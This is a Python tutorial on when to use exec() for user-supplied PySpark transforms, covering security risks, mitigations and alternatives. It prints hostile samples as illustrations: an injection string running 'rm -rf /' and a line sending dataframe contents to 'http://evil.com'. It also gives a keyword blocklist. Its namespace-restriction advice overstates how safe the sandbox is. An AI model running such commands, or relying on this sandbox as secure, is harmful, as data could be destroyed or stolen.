# When and why use exec

## 🎯 Why Use exec()?

**Problem:** You need to run **user-provided Python code** that you don't know in advance.

**Solution:** `exec()` lets you execute code as a string.

---

## ✅ WHEN to Use exec()

### **Use Case 1: User-Defined Transformations (Your App)**

**Problem:**
```python
# You can't predict what users want to do
# User 1 wants: df.filter(df['amount'] > 50000)
# User 2 wants: df.groupBy('customer').agg(F.sum('amount'))
# User 3 wants: df.withColumn('risk', calculate_complex_risk_score(...))

# How do you handle infinite possibilities?
```

**Solution with exec():**
```python
# User provides their logic as a string
transform_code = input("Enter your transform: ")

# Execute it
local_vars = {'df': df, 'F': F}
exec(transform_code, {}, local_vars)
transformed_df = local_vars['df']
```

**Why exec() is justified:**
- ✅ Infinite flexibility for users
- ✅ Don't need to predict all possible transforms
- ✅ Users can write complex logic
- ✅ No need to build a complex DSL (domain-specific language)

---

### **Use Case 2: Configuration-Driven Logic**

**Problem:**
```python
# You have 100 different data pipelines
# Each needs different validation rules
# Rules change frequently
```

**Solution with exec():**
```python
# config.json
{
  "pipeline1": {
    "validation": "df['amount'] > 0 and df['date'] is not None"
  },
  "pipeline2": {
    "validation": "len(df['customer_id']) == 10"
  }
}

# Runtime
config = load_config()
validation_code = config['pipeline1']['validation']
is_valid = eval(validation_code)  # Similar to exec
```

**Why exec() is justified:**
- ✅ Configurable without code changes
- ✅ Non-developers can update rules
- ✅ Hot-reload configurations

---

### **Use Case 3: Dynamic Code Generation**

**Problem:**
```python
# Generate code based on schema
# Schema has 100 columns, changes daily
```

**Solution with exec():**
```python
# Generate code dynamically
code = "df = df.select("
for col in schema.columns:
    code += f"F.col('{col}').cast('string'), "
code += ")"

exec(code, {'df': df, 'F': F})
```

**Why exec() is justified:**
- ✅ Schema-driven code generation
- ✅ Avoids maintaining 100+ hardcoded columns

---

### **Use Case 4: REPL/Notebook/Interactive Tools**

**Problem:**
```python
# Jupyter notebooks, Python shells
# Users type code interactively
```

**Solution:**
```python
# What Jupyter does internally
user_input = input(">>> ")
exec(user_input)
```

**Why exec() is justified:**
- ✅ Interactive development environment
- ✅ Core feature of the tool

---

## ❌ WHEN NOT to Use exec()

### **Anti-Pattern 1: You Know the Logic in Advance**

**BAD:**
```python
# You know exactly what to do
action = "add"

if action == "add":
    exec("result = a + b", {'a': 5, 'b': 3})
else:
    exec("result = a - b", {'a': 5, 'b': 3})
```

**GOOD:**
```python
# Just use normal code!
if action == "add":
    result = a + b
else:
    result = a - b
```

---

### **Anti-Pattern 2: Simple Calculations**

**BAD:**
```python
# User provides formula
formula = "price * quantity * 0.9"
exec(f"total = {formula}", {'price': 100, 'quantity': 5})
```

**GOOD:**
```python
# Use eval() for expressions
total = eval(formula, {'price': 100, 'quantity': 5})

# Or better: parse and validate
def safe_calculate(formula, vars):
    allowed = {'price', 'quantity'}
    # Parse and validate formula only uses allowed vars
    return eval(formula, {"__builtins__": {}}, vars)
```

---

### **Anti-Pattern 3: Building Strings from User Input**

**VERY BAD (Security Nightmare):**
```python
# User input
column = input("Which column? ")  # User types: "x'); import os; os.system('rm -rf /')#"

# Build code string - DANGEROUS!
code = f"df = df.filter(df['{column}'] > 0)"
exec(code)  # ☠️ CODE INJECTION!
```

**GOOD:**
```python
# Validate input first
allowed_columns = {'amount', 'date', 'customer_id'}
if column not in allowed_columns:
    raise ValueError("Invalid column")

# Use normal Python
df = df.filter(df[column] > 0)
```

---

## 🔒 Security Risks with exec()

### **Risk 1: Code Injection**

```python
# User provides
transform_code = """
import os
os.system('rm -rf /')  # Delete everything!
"""

exec(transform_code)  # ☠️ DISASTER
```

**Mitigation:**
```python
# Restricted namespace
safe_namespace = {'df': df, 'F': F}  # No 'import', no 'os'
exec(transform_code, {"__builtins__": {}}, safe_namespace)
```

---

### **Risk 2: Resource Exhaustion**

```python
# User provides
transform_code = """
while True:
    df = df.union(df)  # Infinite loop, memory explosion
"""

exec(transform_code)  # ☠️ CRASH
```

**Mitigation:**
```python
import signal

def timeout_handler(signum, frame):
    raise TimeoutError("Code took too long")

signal.signal(signal.SIGALRM, timeout_handler)
signal.alarm(30)  # 30 second timeout

try:
    exec(transform_code, {}, safe_namespace)
except TimeoutError:
    print("Transform timed out")
finally:
    signal.alarm(0)
```

---

### **Risk 3: Data Exfiltration**

```python
# User provides
transform_code = """
import requests
requests.post('http://evil.com', data=df.toPandas().to_json())  # Steal data
"""

exec(transform_code)  # ☠️ DATA BREACH
```

**Mitigation:**
```python
# Disable imports
restricted_globals = {
    "__builtins__": {
        "print": print,
        # Only allow safe builtins
    }
}

exec(transform_code, restricted_globals, safe_namespace)
```

---

## 🛡️ Safe exec() Practices

### **Complete Safe Example:**

```python
import ast
import signal

def safe_exec_transform(transform_code, df, timeout=30):
    """
    Safely execute user transform code.
    """
    
    # 1. Validate: Parse code to check syntax
    try:
        ast.parse(transform_code)
    except SyntaxError as e:
        raise ValueError(f"Invalid Python syntax: {e}")
    
    # 2. Blacklist dangerous operations
    dangerous_keywords = ['import', 'eval', 'exec', 'compile', 'open', '__']
    for keyword in dangerous_keywords:
        if keyword in transform_code:
            raise ValueError(f"Forbidden keyword: {keyword}")
    
    # 3. Restricted namespace (only safe tools)
    safe_namespace = {
        'df': df,
        'F': F,
        'Window': Window,
        # No builtins that can access system
    }
    
    # 4. Restricted globals (no imports)
    restricted_globals = {
        "__builtins__": {
            "len": len,
            "str": str,
            "int": int,
            "float": float,
            # Only safe builtins
        }
    }
    
    # 5. Timeout protection
    def timeout_handler(signum, frame):
        raise TimeoutError("Transform exceeded time limit")
    
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(timeout)
    
    try:
        # 6. Execute
        exec(transform_code, restricted_globals, safe_namespace)
        
        # 7. Get result
        if 'df' not in safe_namespace:
            raise ValueError("Transform must modify 'df'")
        
        return safe_namespace['df']
        
    except TimeoutError:
        raise ValueError(f"Transform took longer than {timeout} seconds")
    finally:
        signal.alarm(0)  # Cancel timeout

# Usage
try:
    transformed_df = safe_exec_transform(user_code, df)
except ValueError as e:
    print(f"Error: {e}")
```

---

## 🔄 Alternatives to exec()

### **Alternative 1: Predefined Functions**

**Instead of:**
```python
transform_code = "df = df.filter(df['amount'] > 50000)"
exec(transform_code)
```

**Use:**
```python
def filter_by_amount(df, threshold):
    return df.filter(df['amount'] > threshold)

# User selects from dropdown
transforms = {
    'filter_amount': filter_by_amount,
    'group_by_customer': group_by_customer,
}

selected_transform = transforms[user_choice]
df = selected_transform(df, user_params)
```

**Pros:**
- ✅ Type-safe
- ✅ Testable
- ✅ No security risks

**Cons:**
- ❌ Limited flexibility
- ❌ Must implement each transform

---

### **Alternative 2: DSL (Domain-Specific Language)**

**Instead of:**
```python
exec("df = df.filter(...).groupBy(...)")
```

**Use:**
```python
# JSON DSL
transform_config = {
    "operations": [
        {"type": "filter", "column": "amount", "operator": ">", "value": 50000},
        {"type": "groupBy", "columns": ["customer_id"]},
        {"type": "agg", "column": "amount", "function": "sum"}
    ]
}

# Execute DSL
for op in transform_config['operations']:
    if op['type'] == 'filter':
        df = df.filter(df[op['column']] > op['value'])
    elif op['type'] == 'groupBy':
        df = df.groupBy(*op['columns'])
    # etc.
```

**Pros:**
- ✅ Declarative
- ✅ Serializable
- ✅ Safe

**Cons:**
- ❌ Less flexible than code
- ❌ More complex to implement

---

### **Alternative 3: AST (Abstract Syntax Tree)**

**Instead of:**
```python
exec(transform_code)
```

**Use:**
```python
import ast

def safe_eval_expression(expr, namespace):
    """
    Safely evaluate only expressions (no assignments, imports, etc.)
    """
    tree = ast.parse(expr, mode='eval')
    
    # Validate: only allow safe nodes
    for node in ast.walk(tree):
        if isinstance(node, (ast.Import, ast.ImportFrom)):
            raise ValueError("Imports not allowed")
    
    return eval(compile(tree, '<string>', 'eval'), {"__builtins__": {}}, namespace)

# Usage
result = safe_eval_expression("df['amount'] > 50000", {'df': df})
```

**Pros:**
- ✅ Parse and validate before execution
- ✅ Granular control

**Cons:**
- ❌ Complex to implement
- ❌ Still has risks

---

## 📊 Decision Matrix

| Scenario | Use exec()? | Why? | Alternative |
|----------|-------------|------|-------------|
| User-defined transforms | ✅ Yes | Infinite flexibility needed | DSL (limited) |
| Fixed set of operations | ❌ No | Logic known in advance | Normal functions |
| Simple calculations | ❌ No | eval() or parser better | eval() with validation |
| Configuration rules | ⚠️ Maybe | Depends on trust level | JSON rules + interpreter |
| Interactive shell/REPL | ✅ Yes | Core feature | N/A |
| Data pipeline ETL | ❌ No | Airflow/Dagster better | Workflow engine |

---

## 🎯 Your App's Use Case

**Your transform feature:**

```python
# User provides custom PySpark code
transform_code = """
df = df.filter(df['loan_amount'] > 50000)
df = df.withColumn('risk_score', calculate_risk(...))
"""

local_vars = {'df': df, 'F': F, 'Window': Window}
exec(transform_code, {}, local_vars)
```

**Is exec() justified here?**

✅ **YES** - Because:

1. **Infinite possibilities**: Can't predict all transforms users need
2. **PySpark complexity**: filter, groupBy, window functions, UDFs - too many to hardcode
3. **User expertise**: Power users know PySpark, let them use it
4. **Competitive feature**: Databricks, Jupyter all allow custom code

**But you MUST:**

1. ✅ Validate syntax before exec
2. ✅ Restrict namespace (no imports)
3. ✅ Add timeout protection
4. ✅ Blacklist dangerous keywords
5. ✅ Run in isolated environment (Docker)
6. ✅ Warn users about security
7. ✅ Audit/log all executed code

---

## 💡 Summary

### **Use exec() ONLY when:**

1. ✅ User needs to provide **arbitrary logic**
2. ✅ You **can't predict** what they'll do
3. ✅ **No safer alternative** exists
4. ✅ You **implement security measures**

### **DON'T use exec() when:**

1. ❌ Logic is **known in advance**
2. ❌ Simple **calculation/expression**
3. ❌ **Untrusted input** without validation
4. ❌ **Safer alternative** exists (functions, DSL)

### **Security Checklist:**

```python
# If you must use exec()
□ Parse with ast.parse() first
□ Blacklist dangerous keywords
□ Restrict namespace (no builtins)
□ Add timeout
□ Run in isolated environment
□ Log all executed code
□ User authentication
□ Rate limiting
```

---

**Bottom line: exec() is like fire - powerful when controlled, dangerous when not. Use with extreme caution!** 🔥🛡️